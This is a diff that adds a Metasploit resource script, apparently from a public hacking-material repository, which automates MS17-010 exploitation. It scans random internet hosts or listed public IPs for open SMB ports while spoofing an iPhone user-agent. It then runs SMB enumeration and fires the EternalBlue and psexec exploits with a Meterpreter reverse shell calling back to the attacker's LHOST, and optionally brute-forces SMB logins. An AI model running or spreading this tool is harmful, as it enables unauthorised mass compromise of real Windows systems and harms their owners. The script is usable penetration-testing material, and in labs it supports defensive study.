@@ -1,0 +1,205 @@
+   <ruby>
+      run_single("workspace -a redteam")
+      help = %Q|
+
+    Description:
+      setg SAVE_DB true - Save workspace redteam to database.xml
+      setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
+      setg LHOST 192.168.1.71 - The local ip address to use in msf payload build.
+      setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
+      setg RHOSTS 46.147.255.230 194.58.118.182 - To instruct db_nmap to scan hosts for ports open.
+      setg PAYLOAD windows/meterpreter/reverse_tcp - Payload to use in remote exploitation attempt.
+      ms17_010.rc will use nmap to populate the msfdb database with remote hosts address then it trigger
+      msf exploits/auxiliary/scanners based on host(s) open port(s) and service name discovery.
+
+    Execute in msfconsole:
+      setg SAVE_DB <true-or-blank>
+      setg LIMMIT <number-of-rhosts>
+      setg LHOST <local-ip-address>
+      setg RANDOM_HOSTS <true-or-blank>
+      setg PAYLOAD <msf-payload-to-send>
+      setg RHOSTS <hosts-separated-by-spaces>
+      resource <path-to-script>/ms17_010.rc
+
+    Author:
+      r00t-3xp10it  <pedroubuntu10[at]gmail.com>
+      |
+      print_line(help)
+      Rex::sleep(1.5)
+      print_line("")
+
+
+      ## Make sure we are connected to db
+      unless framework.db.active
+        print_error("[ERROR] Database not connected to postgresql.")
+        print_warning("[execute] service postgresql start")
+        run_single("exit")
+        return nil
+      else
+        local = Dir.pwd
+        work_name = framework.db.workspace.name
+        print_good("Database connected to postgresql.")
+        print_status("Working in workspace: *#{work_name}")
+        Rex::sleep(1.0)
+      end
+
+      ## Sellect the type of nmap scan to use
+      if (framework.datastore['RANDOM_HOSTS'] == "true")
+         if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
+           run_single("setg LIMMIT 600")
+           print_line("RHOSTS => Random Search in WAN for #{framework.datastore['LIMMIT']} alive hosts")
+         else
+           print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
+           print_line("RHOSTS => Random Search in WAN for #{framework.datastore['LIMMIT']} alive hosts")
+         end
+      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
+         run_single("setg RHOSTS 192.168.1.0/24")
+      elsif (framework.datastore['RHOSTS'])
+         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
+      end
+
+      ## Metasploit payload to send (exploitation)
+      if (framework.datastore['PAYLOAD'] == nil or framework.datastore['PAYLOAD'] == '')
+         run_single("setg PAYLOAD windows/meterpreter/reverse_tcp")
+      else
+         print_line("PAYLOAD => #{framework.datastore['PAYLOAD']}")
+      end
+
+      ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings
+      # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
+      unless (framework.datastore['RANDOM_HOSTS'] == "true")
+         run_single("db_nmap -sV -Pn -T4 -O -p 135,445 --open --script=http-headers.nse,smb-os-discovery.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+      else
+         print_good("Nmap: search for random remote hosts with port 445 open")
+         run_single("db_nmap -sV -Pn -T5 -O -iR #{framework.datastore['LIMMIT']} -p 135,445 --open --script=http-headers.nse,smb-os-discovery.nse,smb-vuln-ms17-010.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\"")
+      end
+
+      ## Read metasploit database 
+      run_single("spool ms17_010.log")
+      print_line("")
+      run_single("services")
+      print_good("Sellecting target hosts from msf database.")
+      xhost = framework.db.hosts.map(&:address).join(' ')
+      xport = framework.db.services.map(&:port).join(' ')
+      proto = framework.db.services.map(&:proto).join(' ')
+      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
+      print_status("Target systems detected: #{xname}")
+      Rex::sleep(2.0)
+
+         ## Make sure that exists hosts/ports (open) in database
+         if xhost.nil? or xhost == '' or xhost == ' '
+              print_error("[ERROR] db_nmap scan did not find any alive connections.")
+              print_error("please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unset all")
+              run_single("unsetg all")
+              File.delete('ms17_010.log')
+              run_single("workspace -d redteam")
+              return nil
+         elsif xport.nil? or xport == '' or xport == ' '
+              print_error("[ERROR] db_nmap did not find any 135,445 open ports.")
+              print_error("please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unset all")
+              run_single("unsetg all")
+              File.delete('ms17_010.log')
+              run_single("workspace -d redteam")
+              return nil
+         end
+
+         run_single("setg RHOSTS #{xhost}")
+         ## Make sure we have LHOST option set
+         if (framework.datastore['LHOST'] == nil or framework.datastore['LHOST'] == '')
+         print_error("[ERROR] LHOST option not set.")
+         Rex::sleep(2.0)
+         err = %Q|
+
+        Remark
+        ------
+        This resource script requires LHOST option set to be abble
+        to send a payload to target hosts to spawn a session back.
+
+        set your local host (LHOST)
+        ---------------------------
+        [execute] setg LHOST 192.168.1.71
+        [execute] resource ms17_010.rc
+
+         |
+         print_line(err)
+         run_single("unset all")
+         run_single("unsetg all")
+         File.delete('ms17_010.log')
+         run_single("workspace -d redteam")
+         return nil
+
+         else
+            local_ip = "#{framework.datastore['LHOST']}"
+         end
+
+         ## Remote Exploitation
+         if xport =~ /(135|445)/ or proto =~ /(smb|msrpc)/i
+              print_warning("Remote Target port: 445 smb found")
+              Rex::sleep(1.0)
+              run_single("use auxiliary/scanner/smb/smb_version")
+              run_single("set THREADS 16")
+              print_line("")
+              run_single("services -c name -S smb -R")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/smb/smb_enumusers")
+              run_single("set THREADS 16")
+              print_line("")
+              run_single("services -c name -S smb -R")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/smb/smb_enumshares")
+              run_single("set THREADS 16")
+              print_line("")
+              run_single("services -c name -S smb -R")
+              run_single("exploit")
+              ## Try to exploit remote targets
+              run_single("use exploit/windows/smb/ms17_010_psexec")
+              run_single("set LHOST #{local_ip}")
+              run_single("set PAYLOAD #{framework.datastore['PAYLOAD']}")
+              run_single("set THREADS 200")
+              print_line("")
+              run_single("services -c name -S smb -R")
+              run_single("exploit")
+              run_single("use exploit/windows/smb/ms17_010_eternalblue")
+              run_single("set LHOST #{local_ip}")
+              run_single("set PROCESSNAME lsass.exe")
+              run_single("set PAYLOAD #{framework.datastore['PAYLOAD']}")
+              print_line("")
+              run_single("services -c name -S smb -R")
+              run_single("exploit")
+              ## run brute force auxiliary module?
+              print "[i] Run brute force module (y|n)? "
+                question = gets.chomp
+              if question == "y" or question == "Y" or question == "yes" or question == "YES"
+                 run_single("use auxiliary/scanner/smb/smb_login")
+                 run_single("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
+                 run_single("set STOP_ON_SUCCESS true")
+                 run_single("set THREADS 16")
+                 print_line("")
+                 run_single("services -c name -S smb -R")
+                 run_single("exploit")
+              end
+         end
+
+
+      ## Save current database to local file (database.xml)
+      if (framework.datastore['SAVE_DB'] == "true")
+         rand = Rex::Text.rand_text_alpha(5)
+         print_warning("Exporting database to: #{local}/database_#{rand}.xml")
+         run_single("db_export -f xml -a database_#{rand}.xml")
+      end
+
+      ## Cleaning database and unset global variables
+      print_warning("Please wait, Cleaning global variables.")
+      Rex::sleep(1.5)
+      run_single("unsetg all")
+      run_single("unset all")
+      run_single("workspace -d redteam")
+      run_single("back")
+
+      print_warning("Logfile stored under: #{local}/ms17_010.log")
+      print_warning("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
+   </ruby>
